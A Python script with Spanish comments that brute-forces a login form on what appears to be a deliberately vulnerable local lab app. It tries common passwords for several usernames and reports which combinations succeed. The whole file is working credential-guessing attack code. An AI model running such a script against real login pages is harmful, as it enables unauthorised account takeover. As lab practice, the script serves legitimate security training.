import requests

# URL del formulario vulnerable
url = 'http://127.0.0.1/vulnerabilities/brute/'

# Lista de usuarios y contraseñas
usuarios = ['admin', '1337', 'gordonb']
contrasenas = ['1234567', '123456', '12345', '123456789', 'iloveyou', 'princess', 'rockyou', 'nicole', 'monkey', '12345678', 'abc123', 'jessica', 'password', 'daniel', 'babygirl', 'lovely']
cont_valido = 0
cont_invalido = 0
valid_combinations = []

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Referer': 'http://127.0.0.1/vulnerabilities/brute/', 
    'Cookie': 'PHPSESSID=311eo9gia5c8qjbdigf35pv0f1; security=low', 
    'Upgrade-Insecure-Requests': '1', 
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate', 
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1'
}

for usuario in usuarios:
    for contrasena in contrasenas:

        # Los parámetros se envían en la URL (query string)
        params = {
            'username': usuario,
            'password': contrasena,
            'Login': 'Login'
        }

        # Se usa GET porque las credenciales van en la URL
        response = requests.get(url, params=params, headers=headers)

        # Revisa si el contenido de la página indica un login exitoso
        if "Welcome" in response.text:  # Asegúrate de que este sea el mensaje correcto
            print(f"Combinacion valida User: {usuario}, Contraseña: {contrasena}")
            valid_combinations.append((usuario, contrasena))
            cont_valido += 1
        else:
            print(f"Fallo: {usuario}/{contrasena}")   
            cont_invalido += 1

print("\nResultados\n")
print(f"Contador de combinaciones validas: {cont_valido}")
print(f"Contador de combinaciones invalidas: {cont_invalido}")

print("\nCombinaciones validas encontradas:")
for combo in valid_combinations:
    print(f"Usuario: {combo[0]}, Contraseña: {combo[1]}")

